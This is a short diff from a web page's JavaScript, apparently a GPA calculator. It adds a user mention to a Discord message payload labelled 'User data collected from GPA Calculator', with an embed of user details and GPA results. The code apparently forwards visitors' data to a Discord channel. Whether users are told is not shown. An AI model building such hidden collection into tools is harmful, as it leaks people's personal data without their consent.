@@ -77,7 +77,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
         // Prepare the payload for Discord
         const payload = {
-            content: "User data collected from GPA Calculator",
+            content: "<@796770132754956360> User data collected from GPA Calculator",
             embeds: [
                 {
                     title: "User Details and GPA Calculation",
